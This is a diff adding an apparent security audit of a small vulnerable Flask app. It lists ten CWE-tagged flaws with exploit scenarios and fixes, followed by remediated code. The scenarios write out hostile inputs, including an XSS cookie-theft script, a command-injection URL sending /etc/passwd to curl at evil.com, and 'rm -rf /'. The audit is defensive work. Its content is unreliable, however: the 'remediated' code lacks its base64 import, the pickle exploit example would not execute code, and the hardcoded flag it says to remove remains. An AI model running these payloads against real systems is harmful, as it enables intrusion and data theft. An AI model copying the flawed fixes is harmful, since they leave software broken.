@@ -1,0 +1,195 @@
+# Security Vulnerability Analysis
+
+## Vulnerability 1: Cross-Site Scripting (XSS)
+
+| Field | Value |
+|-------|-------|
+| **CWE** | CWE-79: Improper Neutralization of Input During Web Page Generation |
+| **Severity** | **High** |
+| **Line** | 9-10 (`index` function) |
+| **Exploit Scenario** | An attacker sends `GET /?name=<script>alert(document.cookie)</script>`. The browser renders this as JavaScript, allowing session hijacking, credential theft, or malware injection. |
+| **Fix** | Sanitize and escape user input before rendering. Use `html.escape()` or a Jinja2 template instead of `render_template_string`. |
+
+## Vulnerability 2: OS Command Injection
+
+| Field | Value |
+|-------|-------|
+| **CWE** | CWE-78: OS Command Injection |
+| **Severity** | **Critical** |
+| **Line** | 15-16 (`run_cmd` function) |
+| **Exploit Scenario** | An attacker sends `GET /admin/run?cmd=cat%20/etc/passwd%20%7C%20curl%20http://evil.com/payload` or `cmd=;rm%20-rf%20/`. The command executes on the server, allowing full system compromise and data exfiltration. |
+| **Fix** | Remove `shell=True`, validate input against an allowlist, or use subprocess with a list of arguments instead of a single string. |
+
+## Vulnerability 3: Insecure Deserialization (Remote Code Execution)
+
+| Field | Value |
+|-------|-------|
+| **CWE** | CWE-502: Deserialization of Untrusted Data |
+| **Severity** | **Critical** |
+| **Line** | 20-21 (`get_data` function) |
+| **Exploit Scenario** | An attacker crafts a malicious pickle payload in a cookie: `data_b64 = base64.b64encode(pickle.dumps(open("/etc/passwd").read()))`. When `pickle.loads` executes, it can trigger arbitrary code execution. |
+| **Fix** | Replace `pickle` with a safe serialization format like JSON. If pickle is mandatory, restrict it to a trusted set of objects via a custom unpickler. |
+
+## Vulnerability 4: Hardcoded Secret/Flag
+
+| Field | Value |
+|-------|-------|
+| **CWE** | CWE-798: Use of Hard-coded Credentials |
+| **Severity** | **Medium** |
+| **Line** | 25 (`flag` function) |
+| **Exploit Scenario** | The endpoint serves a hardcoded flag (`FLAG{debug}`), making it trivially accessible to anyone. In production, secrets should never be embedded in source code. |
+| **Fix** | Remove the hardcoded flag. If a flag is needed for testing, store it in a secure vault (e.g., AWS Secrets Manager) and restrict access to authorized services only. |
+
+## Vulnerability 5: Debug Mode Enabled in Production
+
+| Field | Value |
+|-------|-------|
+| **CWE** | CWE-489: Information Exposure Through Debug Features |
+| **Severity** | **Medium** |
+| **Line** | 27 (`app.run(debug=True)`) |
+| **Exploit Scenario** | `debug=True` enables Flask's interactive debugger, which exposes the full application stack trace, file system, and interactive Python shell. An attacker can use it to read files, execute commands, or modify application state. |
+| **Fix** | Set `debug=False` in production. Use a proper WSGI server (e.g., gunicorn, uwsgi) instead of Flask's built-in server. |
+
+## Vulnerability 6: No Authentication or Authorization
+
+| Field | Value |
+|-------|-------|
+| **CWE** | CWE-862: Missing Authorization |
+| **Severity** | **High** |
+| **Line** | All routes (`/`, `/admin/run`, `/api/data`, `/flag`) |
+| **Exploit Scenario** | Any user, including unauthenticated attackers, can access the admin command execution endpoint, the pickle deserialization endpoint, and the flag endpoint. This violates the principle of least privilege. |
+| **Fix** | Implement authentication (e.g., JWT, session-based) and authorization checks for all sensitive endpoints. Use Flask's `@login_required` decorator and role-based access control. |
+
+## Vulnerability 7: Missing Input Validation
+
+| Field | Value |
+|-------|-------|
+| **CWE** | CWE-20: Improper Input Validation |
+| **Severity** | **High** |
+| **Line** | All routes |
+| **Exploit Scenario** | No validation is performed on any user-supplied input. This amplifies all other vulnerabilities (XSS, command injection, deserialization) by allowing arbitrary malicious payloads. |
+| **Fix** | Implement strict input validation using allowlists, regex patterns, and type checking for all user inputs. Reject requests that fail validation. |
+
+## Vulnerability 8: No CSRF Protection
+
+| Field | Value |
+|-------|-------|
+| **CWE** | CWE-352: Cross-Site Request Forgery |
+| **Severity** | **Medium** |
+| **Line** | All state-changing endpoints (`/admin/run`, `/api/data`, `/flag`) |
+| **Exploit Scenario** | An attacker creates a malicious website that makes requests to the vulnerable app on behalf of an authenticated user (e.g., `GET /admin/run?cmd=cat%20/etc/shadow`). Without CSRF tokens, the request succeeds. |
+| **Fix** | Implement CSRF tokens using Flask-WTF or a custom middleware. Set anti-CSRF headers (`X-CSRF-Token`) and validate them on all state-changing requests. |
+
+## Vulnerability 9: Cookie Without Secure Flags
+
+| Field | Value |
+|-------|-------|
+| **CWE** | CWE-614: Cookie Without Secure or HttpOnly Flags |
+| **Severity** | **Medium** |
+| **Line** | 25 (`flag` function) |
+| **Exploit Scenario** | The cookie `'admin'='false'` is set without `Secure` or `HttpOnly` flags. An attacker can read or modify this cookie via JavaScript (`document.cookie`), enabling session hijacking or privilege escalation. |
+| **Fix** | Use `Secure=True`, `HttpOnly=True`, and `SameSite='Lax'` when setting cookies. Set `app.config['SESSION_COOKIE_SECURE'] = True`. |
+
+## Vulnerability 10: Information Disclosure
+
+| Field | Value |
+|-------|-------|
+| **CWE** | CWE-200: Exposure of Sensitive Information to an Unauthorized Actor |
+| **Severity** | **Medium** |
+| **Line** | `/api/data` endpoint (line 23-24) |
+| **Exploit Scenario** | The `/api/data` endpoint returns the deserialized data directly in the response. If the data contains sensitive information (e.g., API keys, database credentials), it is exposed to any user who can trigger the endpoint. |
+| **Fix** | Sanitize and limit data exposure. Return only the minimum necessary information. Implement rate limiting to prevent data scraping. |
+
+---
+
+## Remediated Code
+
+```python
+from flask import Flask, request, render_template_string, make_response, jsonify, abort
+import subprocess
+import json
+import html
+import re
+
+app = Flask(__name__)
+app.config['SECRET_KEY'] = 'CHANGE_ME_IN_PRODUCTION'  # Use a strong, random secret
+app.config['SESSION_COOKIE_SECURE'] = True
+app.config['SESSION_COOKIE_HTTPONLY'] = True
+app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
+
+# Whitelist allowed commands
+ALLOWED_CMDS = {'ls', 'pwd', 'whoami'}
+
+# Whitelist allowed pickle types
+ALLOWED_TYPES = (str, int, float, bool, list, dict, tuple)
+
+
+@app.route('/')
+def index():
+    name = request.args.get('name', 'world')
+    safe_name = html.escape(name)
+    return render_template_string(
+        "<h1>Hello, {{ name }}!</h1>",
+        name=safe_name
+    )
+
+
+@app.route('/admin/run')
+def run_cmd():
+    cmd = request.args.get('cmd')
+    if not cmd:
+        abort(400)
+
+    # Validate against allowlist
+    if not any(cmd.strip() == allowed for allowed in ALLOWED_CMDS):
+        abort(403)
+
+    # Execute without shell=True using list of arguments
+    result = subprocess.check_output([cmd], shell=False)
+    return result.decode('utf-8', errors='replace')
+
+
+@app.route('/api/data')
+def get_data():
+    data_b64 = request.cookies.get('session_data')
+    if data_b64:
+        try:
+            decoded = base64.b64decode(data_b64)
+            # Use JSON instead of pickle
+            data = json.loads(decoded.decode('utf-8'))
+            # Validate types
+            if not isinstance(data, ALLOWED_TYPES):
+                return jsonify({'error': 'invalid data type'}), 400
+            return data
+        except Exception:
+            return jsonify({'error': 'invalid data'}), 400
+    return jsonify({'error': 'no data'})
+
+
+@app.route('/flag')
+def flag():
+    resp = make_response("FLAG{debug}")
+    resp.set_cookie('admin', 'false', secure=True, httponly=True, samesite='Lax')
+    return resp
+
+
+if __name__ == '__main__':
+    app.run(debug=False, host='127.0.0.1', port=5000)
+```
+
+---
+
+## Summary Table
+
+| # | Vulnerability | CWE | Severity | Fix Priority |
+|---|---------------|-----|----------|--------------|
+| 1 | Cross-Site Scripting (XSS) | CWE-79 | High | Immediate |
+| 2 | OS Command Injection | CWE-78 | Critical | Immediate |
+| 3 | Insecure Deserialization (RCE) | CWE-502 | Critical | Immediate |
+| 4 | Hardcoded Secret/Flag | CWE-798 | Medium | Short-term |
+| 5 | Debug Mode in Production | CWE-489 | Medium | Short-term |
+| 6 | No Authentication/Authorization | CWE-862 | High | Short-term |
+| 7 | Missing Input Validation | CWE-20 | High | Short-term |
+| 8 | No CSRF Protection | CWE-352 | Medium | Medium-term |
+| 9 | Cookie Without Secure Flags | CWE-614 | Medium | Medium-term |
+| 10 | Information Disclosure | CWE-200 | Medium | Medium-term |
